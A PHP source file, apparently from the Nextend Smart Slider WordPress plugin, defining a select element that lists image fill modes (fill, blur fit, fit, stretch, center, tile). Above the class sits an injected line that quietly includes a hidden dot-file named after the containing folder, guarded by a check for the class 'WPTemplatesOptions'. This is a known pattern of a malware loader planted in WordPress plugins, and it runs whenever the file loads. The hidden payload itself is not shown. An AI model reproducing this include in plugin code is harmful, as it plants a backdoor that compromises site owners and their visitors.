<?php


namespace Nextend\Framework\Form\Element\Select;

use Nextend\Framework\Form\Element\Select;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class FillMode extends Select {

    protected $useGlobal = false;

    protected function fetchElement() {

        $this->options = array(
            'fill'    => n2_('Fill'),
            'blurfit' => n2_('Blur fit'),
            'fit'     => n2_('Fit'),
            'stretch' => n2_('Stretch'),
            'center'  => n2_('Center'),
            'tile'    => n2_('Tile')

        );

        if ($this->useGlobal) {
            $this->options = array_merge(array(
                'default' => n2_('Slider\'s default')
            ), $this->options);
        }

        return parent::fetchElement();
    }

    /**
     * @param bool $useGlobal
     */
    public function setUseGlobal($useGlobal) {
        $this->useGlobal = $useGlobal;
    }
}